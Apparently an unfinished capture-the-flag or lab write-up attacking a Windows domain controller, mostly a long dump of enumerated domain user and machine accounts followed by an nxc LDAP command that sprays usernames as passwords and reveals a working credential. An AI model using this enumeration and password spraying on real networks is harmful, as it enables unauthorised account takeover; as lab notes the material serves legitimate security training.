    User   seva752                                  1835
    User   arita753                                 1836
    User   pgrace754                                1837
    User   nxander757                               1838
    User   gnora758                                 1839
    User   meric759                                 1840
    User   bsophie760                               1841
    User   vquincy761                               1842
    User   epaula762                                1843
    User   xgavin763                                1844
    User   vdiana764                                1845
    User   wjake766                                 1846
    User   quna767                                  1847
    User   mpaula768                                1848
    User   nkevin769                                1849
    User   teli770                                  1850
    User   ahenry771                                1851
    User   oharper772                               1852
    User   muma773                                  1853
    User   baiden774                                1854
    User   omegan775                                1855
    User   ytom777                                  1856
    User   qyvonne778                               1857
    User   hyusuf779                                1858
    User   wpaul780                                 1859
    User   rliam781                                 1860
    User   qmike782                                 1861
    User   qtara783                                 1862
    User   abianca784                               1863
    User   jyara785                                 1864
    User   xnora786                                 1865
    User   wisaac787                                1866
    User   ialice788                                1867
    User   fjake789                                 1868
    User   pnina790                                 1869
    User   icharlie791                              1870
    User   yzach792                                 1871
    User   ubianca793                               1872
    User   ihannah794                               1873
    User   vopal795                                 1874
    User   dxander796                               1875
    User   lgavin797                                1876
    User   wsam799                                  1877
    User   hxenia800                                1878
    User   qwyatt801                                1879
    User   jreed802                                 1880
    User   ktina803                                 1881
    User   msophie804                               1882
    User   gdaisy805                                1883
    User   fpaul806                                 1884
    User   guna807                                  1885
    User   eisaac808                                1886
    User   rtom809                                  1887
    User   anina810                                 1888
    User   nivy811                                  1889
    User   yyvonne812                               1890
    User   uxander813                               1891
    User   tmegan814                                1892
    User   ipaula815                                1893
    User   ydiana816                                1894
    User   owendy817                                1895
    User   ddiana819                                1896
    User   xopal820                                 1897
    User   qyusuf821                                1898
    User   kfaith822                                1899
    User   qrachel823                               1900
    User   djohn824                                 1901
    User   gwendy825                                1902
    User   ljohn826                                 1903
    User   uulysses827                              1904
    User   ngloria828                               1905
    User   wdelia829                                1906
    User   ograce830                                1907
    User   rnathan832                               1908
    User   isteve833                                1909
    User   kadam834                                 1910
    User   keric835                                 1911
    User   yrachel836                               1912
    User   gtina837                                 1913
    User   gbob839                                  1914
    User   zquinton840                              1915
    User   ndavid841                                1916
    User   ipaul842                                 1917
    User   zlaura843                                1918
    User   claura844                                1919
    User   afiona845                                1920
    User   qcharlie846                              1921
    User   vliam847                                 1922
    User   gopal849                                 1923
    User   lwyatt850                                1924
    User   wfaith851                                1925
    User   qyara852                                 1926
    User   rolivia853                               1927
    User   mbob854                                  1928
    User   iwendy855                                1929
    User   nvera856                                 1930
    User   faiden857                                1931
    User   keva858                                  1932
    User   osteve859                                1933
    User   oyvonne860                               1934
    User   tdaisy861                                1935
    User   lcharlie862                              1936
    User   dcody863                                 1937
    User   ijack864                                 1938
    User   qfaith865                                1939
    User   rsam866                                  1940
    User   tvictor867                               1941
    User   duma868                                  1942
    User   hopal869                                 1943
    User   gisaac870                                1944
    User   peli871                                  1945
    User   ieva872                                  1946
    User   omegan874                                1947
    User   hbeth875                                 1948
    User   plaura876                                1949
    User   bkate877                                 1950
    User   gsophie879                               1951
    User   moscar880                                1952
    User   kbeth881                                 1953
    User   zmegan882                                1954
    User   dgloria883                               1955
    User   kzara884                                 1956
    User   feli885                                  1957
    User   hvictor886                               1958
    User   ecody887                                 1959
    User   fyara888                                 1960
    User   mdaisy889                                1961
    User   bursula890                               1962
    User   cdavid891                                1963
    User   lharper892                               1964
    User   khannah893                               1965
    User   tquincy894                               1966
    User   spaul895                                 1967
    User   iuma896                                  1968
    User   sxenia897                                1969
    User   ddavid898                                1970
    User   bliam899                                 1971
    User   wcolin900                                1972
    User   lvictor901                               1973
    User   zwendy902                                1974
    User   ceric903                                 1975
    User   jxenia904                                1976
    User   ohenry905                                1977
    User   ehelen906                                1978
    User   cnora907                                 1979
    User   wtina908                                 1980
    User   stina909                                 1981
    User   ereed910                                 1982
    User   qvictor911                               1983
    User   apaul912                                 1984
    User   ccharlie913                              1985
    User   gnoah914                                 1986
    User   uyvonne915                               1987
    User   dfiona916                                1988
    User   xtom918                                  1989
    User   agloria919                               1990
    User   urose920                                 1991
    User   lzach922                                 1992
    User   xkylie923                                1993
    User   mquinton924                              1994
    User   lfiona925                                1995
    User   yfrank928                                1996
    User   vkevin929                                1997
    User   iyusuf930                                1998
    User   ifrank931                                1999
    User   pyara932                                 2000
    User   bolivia933                               2001
    User   tgrace934                                2002
    User   orose935                                 2003
    User   hzach936                                 2004
    User   folivia937                               2005
    User   mbob938                                  2006
    User   kaiden939                                2007
    User   rtara940                                 2008
    User   vquincy941                               2009
    User   mnora942                                 2010
    User   fwyatt943                                2011
    User   ryvonne944                               2012
    User   uquincy945                               2013
    User   avera946                                 2014
    User   xbella947                                2015
    User   brose948                                 2016
    User   oquinton949                              2017
    User   iuma950                                  2018
    User   squincy951                               2019
    User   qursula952                               2020
    User   akevin953                                2021
    User   yquinn954                                2022
    User   padam955                                 2023
    User   pgrace956                                2024
    User   egloria957                               2025
    User   asean958                                 2026
    User   zmegan959                                2027
    User   syusuf960                                2028
    User   tfaith961                                2029
    User   nquinn962                                2030
    User   ijohn963                                 2031
    User   reva964                                  2032
    User   kethan965                                2033
    User   slaura966                                2034
    User   solivia967                               2035
    User   ijake968                                 2036
    User   mmark969                                 2037
    User   vfiona970                                2038
    User   fhannah971                               2039
    User   rrachel972                               2040
    User   aoliver973                               2041
    User   talice974                                2042
    User   irita976                                 2043
    User   njudy977                                 2044
    User   rtina979                                 2045
    User   ivictor980                               2046
    User   sisaac981                                2047
    User   yoliver982                               2048
    User   dbella983                                2049
    User   vdaisy984                                2050
    User   jethan986                                2051
    User   ojake987                                 2052
    User   tgrace989                                2053
    User   uquinn990                                2054
    User   xursula991                               2055
    User   ojudy992                                 2056
    User   lhelen993                                2057
    User   cbianca994                               2058
    User   hbella995                                2059
    User   llila996                                 2060
    User   fgloria997                               2061
    User   fjudy998                                 2062
    User   WebServer$                               2063
    User   DatabaseServer$                          2064
    User   FileServer$                              2065
    User   MailServer$                              2066
    User   BackupServer$                            2067
    User   ApplicationServer$                       2068
    User   PrintServer$                             2069
    User   ProxyServer$                             2070
    User   MonitoringServer$                        2071
    User   CitrixServer$                            2072
    User   PC-1$                                    2073
    User   PC-2$                                    2074
    User   PC-3$                                    2075
    User   PC-4$                                    2076
    User   PC-5$                                    2077
    User   PC-6$                                    2078
    User   PC-7$                                    2079
    User   PC-8$                                    2080
    User   PC-9$                                    2081
    User   PC-10$                                   2082
    User   PC-11$                                   2083
    User   PC-12$                                   2084
    User   PC-13$                                   2085
    User   PC-14$                                   2086
    User   PC-15$                                   2087
    User   PC-16$                                   2088
    User   PC-17$                                   2089
    User   PC-18$                                   2090
    User   PC-19$                                   2091
    User   PC-20$                                   2092
    User   PC-21$                                   2093
    User   PC-22$                                   2094
    User   PC-23$                                   2095
    User   PC-24$                                   2096
    User   PC-25$                                   2097
    User   PC-26$                                   2098
    User   PC-27$                                   2099
    User   PC-28$                                   2100
    User   PC-29$                                   2101
    User   PC-30$                                   2102
    User   PC-31$                                   2103
    User   PC-32$                                   2104
    User   PC-33$                                   2105
    User   PC-34$                                   2106
    User   PC-35$                                   2107
    User   PC-36$                                   2108
    User   PC-37$                                   2109
    User   PC-38$                                   2110
    User   PC-39$                                   2111
    User   PC-40$                                   2112
    User   PC-41$                                   2113
    User   PC-42$                                   2114
    User   PC-43$                                   2115
    User   PC-44$                                   2116
    User   PC-45$                                   2117
    User   PC-46$                                   2118
    User   PC-47$                                   2119
    User   PC-48$                                   2120
    User   PC-49$                                   2121
    User   PC-50$                                   2122
    User   PC-51$                                   2123
    User   PC-52$                                   2124
    User   PC-53$                                   2125
    User   PC-54$                                   2126
    User   PC-55$                                   2127
    User   PC-56$                                   2128
    User   PC-57$                                   2129
    User   PC-58$                                   2130
    User   PC-59$                                   2131
    User   PC-60$                                   2132
    User   PC-61$                                   2133
    User   PC-62$                                   2134
    User   PC-63$                                   2135
    User   PC-64$                                   2136
    User   PC-65$                                   2137
    User   PC-66$                                   2138
    User   PC-67$                                   2139
    User   PC-68$                                   2140
    User   PC-69$                                   2141
    User   PC-70$                                   2142
    User   PC-71$                                   2143
    User   PC-72$                                   2144
    User   PC-73$                                   2145
    User   PC-74$                                   2146
    User   PC-75$                                   2147
    User   PC-76$                                   2148
    User   PC-77$                                   2149
    User   PC-78$                                   2150
    User   PC-79$                                   2151
    User   PC-80$                                   2152
    User   PC-81$                                   2153
    User   PC-82$                                   2154
    User   PC-83$                                   2155
    User   PC-84$                                   2156
    User   PC-85$                                   2157
    User   PC-86$                                   2158
    User   PC-87$                                   2159
    User   PC-88$                                   2160
    User   PC-89$                                   2161
    User   PC-90$                                   2162
    User   firewall_svc                             2163
    User   backup_svc                               2164
    User   web_svc                                  2165
    User   monitoring_svc                           2166
    User   admin                                    2168

[*] 10.201.44.189: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


#### ldap brute

```
nxc ldap  10.201.44.189 -u userlist.txt -p userlist.txt --no-bruteforce --continue-on-success | grep -v '[-]'
LDAP                     10.201.44.189   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP                     10.201.44.189   389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

## smb enum
```

```




## Referencias

- https://www.youtube.com/watch?v=dkD9Cf66jbg
- 